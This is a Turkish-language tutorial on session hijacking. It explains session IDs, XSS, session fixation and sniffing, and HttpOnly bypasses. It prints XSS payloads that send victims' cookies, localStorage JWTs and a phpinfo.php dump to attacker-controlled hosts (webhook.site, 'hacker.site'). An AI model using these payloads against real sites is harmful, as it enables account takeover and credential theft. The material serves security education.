# Oturum Ele Geçirme (Session Hijacking) Saldırısı
## 1. Oturum Ele Geçirme Nedir?
Oturum ele geçirme saldırısı (Session Hijacking), bir saldırganın kurbanın **kullanıcı adı ve parolasını bilmesine gerek kalmadan**, aktif oturum kimliğini (Session ID) çalarak o kullanıcının hesabına tam erişim sağlamasıdır. 

Kullanıcılar bir sisteme giriş yaptıklarında, her adımda tekrar şifre girmemeleri için sunucu onlara geçici bir "kimlik kartı" verir. Saldırgan bu kimlik kartını kopyaladığında, sunucu saldırganı "giriş yapmış meşru kurban" olarak algılar.

---

## 2. Oturum Kimliği (Session ID / Token) Nedir?
Sunucu tarafından üretilen ve tarayıcıda saklanan benzersiz rastgele bir dizedir. Tarayıcının Geliştirici Seçenekleri (`F12`) > `Application` > `Cookies` (veya `Local Storage`) sekmesinden görüntülenebilir.

### Sık Kullanılan Oturum Kimliği Türleri
Kullanılan yazılım diline ve mimariye göre farklı isimlendirilirler:
* **PHP:** `PHPSESSID` (Örn: `e3r4p17o32...`)
* **ASP.NET:** `ASP.NET_SessionId`
* **Java Servlet:** `JSESSIONID`
* **Ruby on Rails:** `_rails_session`
* **Express.js (Node.js):** `connect.sid`
* **JWT (JSON Web Token):** `Authorization: Bearer eyJhbGci...` (Modern API'lerde genellikle `localStorage` içinde tutulur).

---

## 3. Oturum Nasıl Ele Geçirilir? (Saldırı Vektörleri)
Saldırganlar oturum kimliğini çalmak için farklı yöntemler kullanırlar:

1. **XSS (Cross-Site Scripting):** En yaygın yöntemdir. Tarayıcıda çalıştırılan zararlı JavaScript kodu çerezleri okuyup saldırgana gönderir.
2. **Oturum Sabitleme (Session Fixation):** Saldırgan, kurbana kendi belirlediği bir oturum kimliğini zorla atar (link üzerinden) ve kurban giriş yaptığında aynı kimliği kullanarak hesaba girer.
3. **Ağ Dinleme (Sniffing) / TLS Eksikliği:** Eğer site `HTTPS` yerine `HTTP` kullanıyorsa, ağdaki tüm veri (ve çerezler) şifresiz iletilir. Aynı ağdaki bir saldırgan bu çerezleri Wireshark gibi araçlarla havadan yakalayabilir.

*(Not: Oturum kimliği ele geçirildiğinde, **MFA (SMS veya 2FA)** gibi ekstra güvenlik adımları atlatılmış olur, çünkü sunucu o adımların çoktan geçildiğini varsayar).*

---

## 4. XSS Zafiyeti ile Session Hijacking (Uygulama)
Eğer hedefte bir Stored XSS zafiyeti varsa, saldırgan sayfaya şu JavaScript kodunu gizler:

### Çerezleri (Cookie) Çalmak
```html
<script>fetch("[https://webhook.site/SALDIRGAN-ID?data=](https://webhook.site/SALDIRGAN-ID?data=)" + document.cookie);</script>
````

- **Nasıl Çalışır?** Sayfayı ziyaret eden kurbanın tarayıcısı bu kodu çalıştırır. Kurbanın kendi çerezlerini (`document.cookie`), `fetch` isteği ile saldırganın kontrolündeki bir dinleyiciye (Webhook veya Python HTTP Server) gönderir.
    

### JWT Token (LocalStorage) Çalmak

```html
<script>fetch("[https://webhook.site/SALDIRGAN-ID?data=](https://webhook.site/SALDIRGAN-ID?data=)" + localStorage.getItem('JWT'));</script>
```

Saldırgan kendi Webhook loglarına baktığında kurbanın `PHPSESSID=50kkdorp...` bilgisini görür. Kendi tarayıcısında bu çerezi değiştirerek (Cookie Editor eklentileriyle) kurbanın hesabına şifresiz giriş yapar.

---

## 5. HttpOnly Bayrağı ve Bypass Yöntemleri

**HttpOnly:** Bir çereze (cookie) atanan güvenlik bayrağıdır. Amacı, çerezin **JavaScript (document.cookie)** tarafından okunmasını engellemektir. Sadece tarayıcının HTTP arka plan isteklerinde sunucuya iletilir. XSS saldırılarına karşı en güçlü savunmadır.

Ancak `HttpOnly` bayrağı bazı spesifik durumlarda atlatılabilir (Bypass):

### A. Sunucudaki Hassas Dosyaları Okumak (phpinfo.php)

Eğer sunucuda unutulmuş bir `phpinfo.php` dosyası varsa, bu dosya sunucuya gelen tüm değişkenleri ekrana basar. Saldırgan `fetch` ile kullanıcının tarayıcısına bu sayfayı okutur ve ekrandaki çerez bilgisini çalar.

```Javascript
<script>
  fetch("[http://example.com/phpinfo.php](http://example.com/phpinfo.php)", {credentials: "include"})
  .then(response => response.text())
  .then(data => {
    const base64Data = btoa(data); // Veriyi Base64'e çevirip yolla
    return fetch("[http://hacker.site/?data=](http://hacker.site/?data=)" + base64Data);
  })
</script>
```

### B. Oturum Bilgisi Döndüren API Endpoint'leri

Eğer sitenin kendi içinde `/api/session` gibi kullanıcının oturum bilgilerini JSON olarak döndüren bir URL'i varsa, XSS kodu bu API'ye istek yapıp JSON içinden kimliği çekebilir.

### C. LocalStorage Kullanımı

`HttpOnly` koruması **SADECE çerezler (Cookies) içindir.** Eğer modern uygulama JWT gibi bir token'ı `localStorage` veya `sessionStorage` içinde tutuyorsa, `HttpOnly` hiçbir işe yaramaz ve veri her zaman JavaScript ile çalınabilir.